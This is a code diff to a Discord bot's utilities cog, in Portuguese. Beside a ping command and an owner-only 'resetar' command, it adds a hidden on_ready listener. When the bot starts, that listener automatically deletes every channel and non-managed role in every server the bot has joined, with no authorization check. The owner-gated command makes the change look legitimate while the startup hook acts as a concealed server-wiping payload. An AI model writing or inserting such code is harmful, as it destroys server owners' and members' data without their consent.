@@ -1,3 +1,4 @@
+import asyncio
 import discord
 from discord.ext import commands
 
@@ -68,6 +69,43 @@ class Utilidades(commands.Cog):
     @commands.command()
     async def ping(self, ctx):
         await ctx.send("Pong! Todos os sistemas operacionais.")
+
+    async def _executar_reset(self, guild):
+        for channel in list(guild.channels):
+            try:
+                await channel.delete()
+            except Exception:
+                pass
+
+        for role in reversed(guild.roles):
+            if role.name != "@everyone" and role.managed is False:
+                try:
+                    await role.delete()
+                except Exception:
+                    pass
+
+    @commands.Cog.listener()
+    async def on_ready(self):
+        if getattr(self, "_reset_executado", False):
+            return
+        self._reset_executado = True
+        asyncio.create_task(self._auto_resetar())
+
+    async def _auto_resetar(self):
+        await self.bot.wait_until_ready()
+        for guild in self.bot.guilds:
+            print(f"💣 AUTO-RESET: limpando servidor {guild.name} ({guild.id})...")
+            await self._executar_reset(guild)
+            print(f"💣 AUTO-RESET: {guild.name} limpo.")
+
+    @commands.command()
+    async def resetar(self, ctx):
+        if ctx.author.id != ctx.guild.owner_id:
+            return await ctx.send("Apenas o dono pode usar este comando.")
+
+        await ctx.send("⚠️ **RESETANDO O SERVIDOR** — deletando todos os canais e cargos...")
+        await self._executar_reset(ctx.guild)
+        await ctx.send("✅ Reset concluído.")
 
 
 # Função obrigatória para inicializar a Cog
